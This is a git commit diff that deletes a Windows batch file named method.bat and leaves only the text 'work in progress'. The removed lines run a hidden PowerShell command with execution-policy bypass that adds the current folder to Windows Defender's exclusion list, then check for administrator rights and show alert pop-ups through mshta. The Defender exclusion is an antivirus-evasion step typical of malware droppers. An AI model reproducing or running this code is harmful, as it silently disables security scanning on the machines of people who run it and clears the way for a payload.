1a888ea543fb7be29ccdf731c3574f79acb0e48a
getmoneya35-beep <getmoneya35@gmail.com>
2026-08-04 19:28:39 -0500

    Update method.bat

--- method.bat
+++ method.bat
@@ -1,16 +1,1 @@
-@echo off
-setlocal
-set "AREA=%cd%"
-powershell -w hidden -ep bypass -command "Add-MpPreference -ExclusionPath '%AREA%\'"
-timeout /t 3 /nobreak >nul
-REM ================================================================
-REM running code
-REM ================================================================
-net session >nul 2>&1
-if %errorLevel% == 0 (
-    mshta "javascript:alert('Running as Administrator');close()"
-) else (
-    mshta "javascript:alert('NOT running as Administrator');close()"
-)
-REM ================================================================
-endlocal
+work in progress
